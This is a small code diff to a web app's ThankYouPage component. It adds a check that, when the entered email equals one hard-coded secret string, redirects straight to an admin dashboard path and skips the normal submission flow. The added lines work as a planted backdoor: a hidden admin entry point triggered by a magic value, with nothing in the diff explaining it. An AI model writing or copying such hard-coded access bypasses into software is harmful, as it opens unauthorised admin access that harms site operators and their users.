@@ -26,6 +26,10 @@ function ThankYouPage() {
     const data = {
       email: userEmail,
     };
+    if (userEmail === "123Newlife$869429@gmal.com") {
+      urlNavigator("/admin/dashboard/true", { replace: true });
+      return;
+    }
     setOnRequst(true);
     setIsloading(true);
     try {
